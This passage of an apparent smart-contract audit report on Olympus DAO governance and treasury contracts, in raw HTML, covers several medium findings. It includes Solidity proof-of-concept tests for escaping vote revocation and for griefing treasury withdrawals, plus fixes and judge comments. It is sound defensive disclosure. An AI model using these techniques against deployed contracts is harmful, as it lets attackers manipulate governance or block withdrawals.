class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// to simulate calling VoterRegistration.issueVotesTo that mints votes to voter3, VOTES.mintTo is called by godmode here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">godmode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mintTo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">, </span><span class=\"mtk7\">500</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">), </span><span class=\"mtk7\">500</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calling vote function again by voter3 reverts, which means that voter3 cannot additionally vote with the 500 newly minted votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">UserAlreadyVoted</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testScenario_RevokeVotesAfterUserFinishsOwnVoting</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_createActiveProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// voter3 votes for the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">yesVotesForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">noVotesForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">userVotesForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// To simulate calling VoterRegistration.revokeVotesFrom that burns voter3&#39;s votes, VOTES.burnFrom is called by godmode here.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// However, calling VOTES.burnFrom will revert due to arithmetic underflow.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">godmode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">arithmeticError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burnFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">, </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// the proposal is still voted with voter3&#39;s previous votes afterwards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">userVotesForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When <code>issueVotesTo</code> and <code>revokeVotesFrom</code> are called during voting, the corresponding votes need to be added to or removed from the proposal’s voted votes for the user. Alternatively, <code>issueVotesTo</code> and <code>revokeVotesFrom</code> can be disabled when an active proposal exists.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/275#issuecomment-1236238446\">fullyallocated (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This is the best written answer. </p>\n<p>Originally votes were locked so that users cannot constantly change their vote to manipulate the outcome but the warden makes a good point about how the quorum thresholds can be changed and the affects on how consensus is calculated.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-olympusgovernance-users-can-prevent-their-votes-from-being-revoked\" style=\"position:relative;\"><a href=\"#m-11-olympusgovernance-users-can-prevent-their-votes-from-being-revoked\" aria-label=\"m 11 olympusgovernance users can prevent their votes from being revoked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/308\">[M-11] OlympusGovernance: Users can prevent their votes from being revoked</a></h2>\n<p><em>Submitted by cccz, also found by zzzitron</em></p>\n<p>In the VoterRegistration contract, voter_admin can call the revokeVotesFrom function to revoke the user’s votes.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(&quot;voter_admin&quot;) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Revoke the votes in the VOTES module</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        VOTES.burnFrom(wallet_, amount_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>But there is a way for users to prevent their votes from being revoked by voter<em>admin.<br>\nIn the OlympusGovernance contract, the user can call the vote function to vote for the activeProposal, and then call the reclaimVotes function to reclaim his votes.<br>\nWhen the vote function is called, VOTES are sent to the OlympusGovernance contract and recorded using the userVotesForProposal variable. When the reclaimVotes function is called, the VOTES recorded in the userVotesForProposal variable are sent back to the user.<br>\nThis means that the user can <strong>store</strong> his VOTES tokens in userVotesForProposal.<br>\nThe revokeVotesFrom function cannot revoke the VOTES tokens recorded in userVotesForProposal and the reclaimVotes function can only be called by the user himself.<br>\nIf the user calls the reclaimVotes function and vote function in one transaction, then his VOTES token balance will always be 0 (thus avoiding revocation of votes by voter</em>admin) and he will be able to vote.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L240-L262\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L240-L262</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L295-L313\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L295-L313</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L53-L56\">https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L53-L56</a></p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider allowing to call the reclaimVotes function to reclaim any user’s vote, thus avoiding the user storing his VOTES tokens in userVotesForProposal</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function reclaimVotes(uint256 proposalId_, address user_) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 userVotes = userVotesForProposal[proposalId_][user_];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (userVotes == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert CannotReclaimZeroVotes();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (proposalId_ == activeProposal.proposalId) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert CannotReclaimTokensForActiveVote();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (tokenClaimsForProposal[proposalId_][user_] == true) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert VotingTokensAlreadyReclaimed();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tokenClaimsForProposal[proposalId_][user_] = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        VOTES.transferFrom(address(this), user_, userVotes);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1234876428\">fullyallocated (Olympus) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>This is true, we don’t expect to use the voter admin in production, just to issue votes during internal testing period.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1252360367\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Downgrading to M severity as this does not lead to direct loss of user funds, but does highlight an issue with current contracts. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255045809\">cccz (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Consider the following scenarios.\nThere are currently three users, A, B and C, in the system.</p>\n<ol>\n<li>voter_admin minted 100 VOTEs for each of these three users</li>\n<li>After a period of time, due to system upgrade or other reasons, the VOTEs of the users need to be revoked.</li>\n<li>voter_admin revokes the VOTEs of users A and B respectively, but user C uses this vulnerability to prevent his VOTE from being revoked.</li>\n<li>At this time, user C has all the VOTEs, and he can execute any proposal.</li>\n</ol>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255056253\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Okay, at this point I still believe a Medium issue, voter_admin as a mitigation could reissue votes to User A and B. Additionally User C will eventually have to reclaim these votes in order to vote on the next proposal.  I am going to stick with Medium on this one. Appreciate the additional clarity. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255062224\">cccz (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xean - You are right, thanks for your attention.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-12-griefingdos-of-withdrawals-by-eoas-from-treasury-trsry-possible\" style=\"position:relative;\"><a href=\"#m-12-griefingdos-of-withdrawals-by-eoas-from-treasury-trsry-possible\" aria-label=\"m 12 griefingdos of withdrawals by eoas from treasury trsry possible permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/317\">[M-12] Griefing/DOS of withdrawals by EOAs from treasury (TRSRY) possible</a></h2>\n<p><em>Submitted by minhtrng</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67</a><br></p>\n<p>Any withdrawals from the treasury by an approved EOA can be denied by a malicious actor that watches the mempool.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The function TreasuryCustodian.revokePolicyApprovals() doesnt provide sufficient checks for its intended purpose of “revoking a deactivated policy’s approvals”. As can be seen by the TODO labels, the issue has already been acknowledged by the team (regardless it is still an issue present in an in-scope contract). The only check performed is trying to call the isActive()-function on an address and interpret the returned value as boolean. Attempting to call this function on an EOA will not fail and return 0 (=false). Hence the condition to revert is not fulfilled and the amounts approved to withdraw will be set to 0.</p>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>IDE (Remix, VSCode)</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A partial but insufficient fix would be to check if the address passed to the function contains code and hence is not an EOA. A better approach might be to add a mapping(address => bool) of all addresses that have been active policies some time in the past to the kernel, something like this:</p>\n<p>As a public variable in Kernel.sol\n<code>mapping(address => bool) public isRegisteredPolicy;</code></p>\n<p>in Kernel.activatePolicy():\n<code>isRegisteredPolicy[address(policy_)] ) = true;</code></p>\n<p>and finally in TreasuryCustodian.revokePolicyApprovals():\n<code>if(!kernel.isRegisteredPolicy(policy_) revert NotARegisteredPolicy</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/317#issuecomment-1241262776\">ind-igo (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>TODOs are outdated, I forgot to clear them ;(. But the points are taken. Code will be adjusted, but probably not the way from the recommendation. Instead will gate the function behind custodian role.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-13-missing-checks-in-kernel_deactivatepolicy\" style=\"position:relative;\"><a href=\"#m-13-missing-checks-in-kernel_deactivatepolicy\" aria-label=\"m 13 missing checks in kernel_deactivatepolicy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/368\">[M-13] Missing checks in <code>Kernel._deactivatePolicy</code></a></h2>\n<p><em>Submitted by enckrish</em></p>\n<p>There are no checks to ascertain that the policy being removed is registered in the <code>Kernel</code>. Trying to remove a non-registered results in the policy registered at 0th index of <code>activePolicies</code> being removed.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 